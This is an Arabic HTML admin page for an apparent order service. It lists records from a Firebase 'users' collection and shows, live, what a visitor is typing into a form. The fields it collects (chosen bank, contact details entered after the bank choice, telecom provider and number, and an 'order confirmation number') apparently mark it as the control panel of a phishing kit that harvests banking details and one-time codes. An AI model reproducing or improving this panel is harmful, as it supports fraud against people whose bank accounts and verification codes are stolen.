<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>إدارة الطلبات | مكتب مساعد</title>
  <link rel="stylesheet" href="admin.css">
</head>
<body>
  <main class="admin">
    <header><div><p>مكتب مساعد</p><h1>إدارة الطلبات</h1></div><a href="index.html">العودة للموقع</a></header>
    <section class="summary"><div><strong id="count">0</strong><span>إجمالي الطلبات</span></div><div><strong id="new-count">0</strong><span>طلبات جديدة</span></div></section>
    <section class="live-wrap"><h2>طلب قيد الإدخال الآن</h2><div id="live-draft" class="live-draft">لا يوجد إدخال جارٍ حاليًا.</div></section>
    <section id="orders" class="orders"></section>
    <button id="clear" class="clear">حذف جميع بيانات العرض المحلية</button>
  </main>
  <script type="module">
    import { db, collection, deleteDoc, doc, onSnapshot } from './firebase.js';

    const ordersTarget = document.querySelector('#orders');
    const safe = value => String(value || '—').replace(/[&<>"']/g, char => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[char]));
    const formatDate = value => value?.toDate ? value.toDate().toLocaleString('ar-OM') : 'قيد الحفظ...';
    const renderOrders = orders => {
      document.querySelector('#count').textContent = orders.length;
      document.querySelector('#new-count').textContent = orders.filter(order => order.status === 'طلب جديد' || order.status === 'بيانات العميل').length;
      ordersTarget.innerHTML = orders.length ? orders.map(order => `<article class="order"><div class="order-top"><div><span class="id">${safe(order.id)}</span><h2>${safe(order.customerName || order.fullName || order.orderName)}</h2></div><button class="delete-order" type="button" data-id="${safe(order.id)}" title="حذف الطلب">حذف</button></div><span class="status">${safe(order.status)}</span><dl><div><dt>الاسم الكامل</dt><dd>${safe(order.customerName || order.fullName)}</dd></div><div><dt>العنوان</dt><dd>${safe(order.address)}</dd></div><div><dt>رقم الهاتف</dt><dd>${safe(order.phone)}</dd></div><div><dt>البنك المختار</dt><dd>${safe(order.bank)}</dd></div><div><dt>الاسم الكامل بعد اختيار البنك</dt><dd>${safe(order.paymentContactName)}</dd></div><div><dt>رقم الهاتف بعد اختيار البنك</dt><dd>${safe(order.paymentContactPhone)}</dd></div><div><dt>شركة الاتصالات</dt><dd>${safe(order.telecomProvider)}</dd></div><div><dt>رقم جوال الاتصالات</dt><dd>${safe(order.telecomPhone)}</dd></div><div><dt>طريقة الدفع</dt><dd>${safe(order.paymentMethod || 'الدفع عند الاستلام')}</dd></div><div><dt>الاسم الكامل في بيانات الطلب</dt><dd>${safe(order.orderName)}</dd></div><div><dt>رقم الهاتف في بيانات الطلب</dt><dd>${safe(order.orderPhone)}</dd></div><div><dt>رقم الشقة</dt><dd>${safe(order.orderApartment)}</dd></div><div><dt>تاريخ انتهاء الطلب</dt><dd>${safe(order.orderEndDate)}</dd></div><div><dt>رقم تأكيد الطلب</dt><dd>${safe(order.orderNumber)}</dd></div></dl><p class="time">${safe(formatDate(order.createdAt))}</p></article>`).join('') : '<div class="empty">لا توجد بيانات عملاء بعد. ستظهر هنا فور إرسالها.</div>';
    };

    onSnapshot(collection(db, 'users'), snapshot => {
      const orders = snapshot.docs.map(documentSnapshot => ({ id: documentSnapshot.id, ...documentSnapshot.data() }));
      orders.sort((first, second) => (second.createdAt?.seconds || 0) - (first.createdAt?.seconds || 0));
      renderOrders(orders);
    }, error => {
      console.error('تعذر الاستماع إلى بيانات العملاء:', error);
      document.querySelector('#count').textContent = '0';
      document.querySelector('#new-count').textContent = '0';
      ordersTarget.innerHTML = `<div class="empty">تعذر تحميل بيانات العملاء من Firebase.<br><small>${safe(error.message)}</small></div>`;
    });

    ordersTarget.addEventListener('click', async event => {
      const deleteButton = event.target.closest('.delete-order');
      if (!deleteButton) return;
      if (!confirm('هل تريد حذف هذا الطلب؟')) return;
      deleteButton.disabled = true;
      try {
        await deleteDoc(doc(db, 'users', deleteButton.dataset.id));
      } catch (error) {
        console.error('تعذر حذف الطلب:', error);
        deleteButton.disabled = false;
        alert(`تعذر حذف الطلب: ${error.message}`);
      }
    });

    document.querySelector('#clear').addEventListener('click', () => { if (confirm('حذف جميع الطلبات المخزنة محليًا؟')) { localStorage.removeItem('musaedOrders'); location.reload(); } });
  </script>
  <script type="module">
    const liveTarget = document.querySelector('#live-draft');
    const escapeValue = value => String(value || '—').replace(/[&<>"']/g, char => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[char]));
    let lastDraft = '';
    const renderLiveDraft = () => {
      const raw = localStorage.getItem('musaedDraft') || '';
      if (raw === lastDraft) return;
      lastDraft = raw;
      const draft = JSON.parse(raw || '{}');
      const rows = Object.entries(draft.liveFields || {});
      liveTarget.innerHTML = rows.length
        ? `<p class="live-status">يتم التحديث مباشرة — آخر تعديل: ${escapeValue(draft.liveUpdatedAt)}</p><dl>${rows.map(([label, value]) => `<div><dt>${escapeValue(label)}</dt><dd>${escapeValue(value)}</dd></div>`).join('')}</dl>`
        : 'لا يوجد إدخال جارٍ حاليًا.';
    };
    renderLiveDraft();
    setInterval(renderLiveDraft, 700);
  </script>
</body>
</html>
